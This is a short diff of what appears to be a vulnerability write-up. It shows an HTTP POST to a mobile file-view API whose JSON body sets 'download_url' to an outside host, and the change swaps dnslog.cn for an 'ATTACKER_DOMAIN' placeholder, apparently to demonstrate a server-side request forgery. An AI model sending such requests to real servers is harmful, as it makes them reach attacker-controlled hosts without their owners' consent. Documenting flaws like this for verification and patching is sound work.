@@ -47,7 +47,7 @@ POST /api/doc/mobile/fileview/getFileViewUrl HTTP/1.1
 Host: your-ip
 Content-Type: application/json
 
-{"file_id":"1000","file_name":"c","download_url":"http://dnslog.cn"}
+{"file_id":"1000","file_name":"c","download_url":"http://ATTACKER_DOMAIN"}
 ```
 
 ## 验证方法
